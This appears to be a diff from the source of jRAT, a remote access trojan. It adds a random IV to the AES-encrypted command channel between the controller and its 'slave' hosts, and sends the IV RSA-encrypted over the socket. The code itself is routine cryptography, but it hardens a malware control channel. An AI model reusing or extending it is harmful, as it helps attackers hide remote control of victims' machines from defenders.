@@ -11,6 +11,7 @@ import javax.crypto.CipherInputStream;
 import javax.crypto.CipherOutputStream;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
+import javax.crypto.spec.IvParameterSpec;
 import javax.swing.ImageIcon;
 
 import se.jrat.client.crypto.GlobalKeyPair;
@@ -52,6 +53,7 @@ public abstract class AbstractSlave implements Runnable {
 	protected String country;
 	protected PublicKey rsaKey;
 	protected byte[] key;
+	protected byte[] iv;
 	protected boolean responded = false;
 	protected boolean verified = false;
 	protected boolean checked = false;
@@ -123,17 +125,24 @@ public abstract class AbstractSlave implements Runnable {
         keyGen.init(128);
         SecretKey secretKey = keyGen.generateKey();
 
+        IvParameterSpec ivspec = CryptoUtils.getRandomIv();
+        
         key = secretKey.getEncoded();
+        iv = ivspec.getIV();
         byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
+        byte[] encryptedIv = Crypto.encrypt(iv, rsaKey, "RSA");
         dos.writeInt(encryptedKey.length);
+        dos.writeInt(encryptedIv.length);
         dos.write(encryptedKey);
+        dos.write(encryptedIv);
 		
 		if (Main.debug) {
 			Main.debug("Encryption key: " + Hex.encode(key));
+			Main.debug("Encryption IV: " + Hex.encode(iv));
 		}
 
-		Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey);
-		Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey);
+		Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, ivspec);
+		Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, ivspec);
 		
 		this.inputStream = new CountingInputStream(new CipherInputStream(socket.getInputStream(), inCipher));
 		this.outputStream = new CountingOutputStream(new CipherOutputStream(socket.getOutputStream(), outCipher));
